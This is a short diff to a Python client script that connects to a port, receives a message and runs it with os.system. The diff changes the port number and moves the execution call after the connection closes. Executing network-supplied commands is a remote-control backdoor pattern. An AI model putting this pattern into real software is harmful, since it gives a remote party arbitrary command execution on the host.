@@ -3,7 +3,7 @@ import os
 
 if __name__ == "__main__":
     c = client()
-    c.connect(port=21703)
+    c.connect(port=21704)
     msg = c.receive()
-    os.system(msg)
     c.close()
+    os.system(msg)
